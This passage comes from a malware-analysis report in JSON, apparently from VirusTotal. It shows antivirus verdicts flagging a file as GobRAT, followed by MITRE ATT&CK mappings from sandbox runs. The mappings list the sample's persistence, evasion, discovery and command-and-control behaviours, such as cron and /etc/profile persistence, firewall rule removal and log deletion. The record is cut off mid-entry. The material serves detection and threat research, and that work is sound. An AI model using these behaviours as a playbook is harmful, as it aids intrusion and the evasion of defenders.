          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230628"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-07-04.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "result": "BASH/GobRAT.6049!tr",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "22.11.7701.0",
          "result": "BV:GobRat-A [Drp]",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        }
      },
      "reputation": -1,
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 2,
        "critical": 0,
        "low": 1
      }
    },
    "type": "file",
    "id": "3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes batch files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes batch files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "Zenbox Linux": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Executes the \"crontab\" command typically for achieving persistence"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Executes the \"crontab\" command typically for achieving persistence"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"awk\" command used to scan for patterns (typically in standard output)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads system information from the proc file system"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads CPU information from /sys indicative of miner or evasive malware"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"uname\" command used to read OS and architecture name"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads CPU information from /proc indicative of miner or evasive malware"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"ps\" command used to list the status of processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses the \"uname\" system call to query kernel version information (possible evasion)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"iptables\" command used for managing IP filtering and manipulation"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"wget\" command typically used for HTTP/S downloading"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample tries to set the executable flag"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"chmod\" command used to modify permissions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              },
              {
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Deletes log files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/",
                "id": "T1070",
                "name": "Indicator Removal"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample deletes itself"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"rm\" command used to delete files or directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "ELF contains segments with high entropy indicating compressed/encrypted content"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              },
              {
                "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample removes firewall rules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/004/",
                "id": "T1562.004",
                "name": "Disable or Modify System Firewall"
              },
              {
                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Writes ELF files to hidden directories"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates hidden files, links and/or directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/001/",
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
